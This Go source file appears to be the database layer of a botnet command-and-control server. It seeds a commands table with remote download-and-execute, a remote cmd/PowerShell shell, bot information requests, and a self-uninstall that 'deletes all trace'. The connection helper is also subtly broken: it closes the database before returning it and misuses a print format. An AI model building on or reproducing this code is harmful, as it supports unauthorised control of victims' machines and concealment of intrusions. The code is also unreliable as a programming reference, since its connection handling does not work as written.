package db1

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"time"
)

// Initialize mysql and connect to it
func InitMysql(username, passwd, dbname string, ip string, port int) *sql.DB {
	dsn := fmt.Sprintf("%s:%s@tcp(%s:%d)/%s?charset=utf8mb4",
		username, passwd, ip, port, dbname)

	db, err := sql.Open("mysql", dsn)
	if err != nil {
		log.Print("sql.Open failed")
		return nil
	}
	defer db.Close()

	err = db.Ping()
	if err != nil {
		fmt.Println("db.Ping failed: %v", err)
		return nil
	}

	db.SetMaxOpenConns(20)
	db.SetMaxIdleConns(10)
	db.SetConnMaxLifetime(time.Hour)

	return db
}

func QueryRow(db *sql.DB, query string, args ...any) *sql.Row {
	return db.QueryRow(query, args...)
}

func QueryRows(db *sql.DB, query string, args ...any) (*sql.Rows, error) {
	return db.Query(query, args...)
}

func Insert(db *sql.DB, query string, args ...any) (int64, error) {
	res, err := db.Exec(query, args...)
	if err != nil {
		return 0, err
	}
	return res.LastInsertId()
}

func Exec(db *sql.DB, query string, args ...any) (int64, error) {
	res, err := db.Exec(query, args...)
	if err != nil {
		return 0, err
	}
	return res.RowsAffected()
}

func InitCommands(db *sql.DB) {
	args := map[string]interface{}{
		"hidden": "string",
		"args":   "string",
	}
	byt, _ := json.Marshal(args)
	// Remote execute
	sqlStr := "insert into commands(name, description, arg_schema, needs_admin) values (?,?,?,?)"
	Insert(db, sqlStr, "execute", "Remote download executing, it could run local files or "+
		"download from remote host and execute", byt, 0)
	// Remote shell
	args1 := map[string]interface{}{
		"type": "string",
	}
	byt, _ = json.Marshal(args1)
	Insert(db, sqlStr, "shell", "Remote commandline shell, cmd or powershell", byt, 0)
	// List bot latest information
	Insert(db, sqlStr, "info", "Request bot latest information", nil, 0)
	// Uninstall bot itself
	Insert(db, sqlStr, "uninstall", "Uninstall the bot and delete all trace", nil, 0)
}
